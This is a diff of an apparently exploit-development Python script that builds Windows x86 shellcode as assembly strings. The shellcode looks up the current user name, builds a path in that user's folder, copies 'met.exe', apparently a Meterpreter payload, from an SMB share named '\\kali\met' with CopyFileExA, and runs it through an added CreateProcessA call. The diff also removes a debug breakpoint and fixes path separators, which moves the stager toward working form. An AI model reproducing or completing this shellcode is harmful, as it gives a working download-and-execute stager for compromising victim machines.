@@ -136,7 +136,7 @@ code += "push 0x5c52aa34;" # GetUserNameA
 code += "call dword ptr [ebp + 0x4];" # call find_function
 code += "mov [ebp + 0x20], eax;" # save GetUserNameA
 
-# -----------------------------CREATE FOLDER PATH----------------------------------------
+# -----------------------CREATE FOLDER PATH------------------------------
 # PUSH VARIABLES
 # pcbbuffer
 code += "mov eax, 0xfffffff0;"  # max user length -10 (avoid null bytes)
@@ -184,7 +184,7 @@ code += "lea eax, [ebp + 0x44];"    # path start address
 code += "mov ebx, [ebp + 0x40];"    # length of string
 code += "dec ebx;"
 code += "add eax, ebx;"             # path end address
-code += "mov ebx, 0x74656d2f;"      # "/met"
+code += "mov ebx, 0x74656d5c;"      # "\met"
 code += "mov [eax], ebx;"
 code += "sub eax, 0xfffffffc;"      # move 4 bytes forward
 code += "mov ebx, 0x6578652e;"      # ".exe"
@@ -195,8 +195,7 @@ code += "xor ebx, ebx;"
 code += "sub eax, 0xfffffffc;"      # move 4 bytes forward
 code += "mov [eax], edx;"
 
-#----------------------------------COPY FILE FROM SMB------------------------------
-code += "int3;"
+#-------------------------COPY FILE FROM SMB----------------------------
 
 # create path for "\\kali\met\met.exe"
 code += "xor eax, eax;"
@@ -205,7 +204,7 @@ code += "push eax;"                 # "xe"
 code += "push 0x652e7465;"          # "et.e"
 code += "push 0x6d5c7465;"          # "et\m"
 code += "push 0x6d5c696c;"          # "li\m"
-code += "push 0x616b5c5c;"          # "//ka"
+code += "push 0x616b5c5c;"          # "\\ka"
 code += "mov edi, esp;"             # save "\\kali\met\met.exe" to edi
 
 code += "mov eax, 0xffffffff;"      # negative 1
@@ -219,6 +218,10 @@ code += "lea eax, [ebp + 0x44];"    # get address pointer for path
 code += "push eax;"                 # push lpNewFileName
 code += "push edi;"                 # push lpExistingFileName
 code += "call dword ptr [ebp + 0x1c];"      # Call CopyFileExA
+
+#-------------------------ÊXECUTE MET.EXE----------------------------
+code += ";" 
+code += "call dword ptr [ebp + 0x18];"      # Call CreateProcessA
 
 
 asm2shell(code)
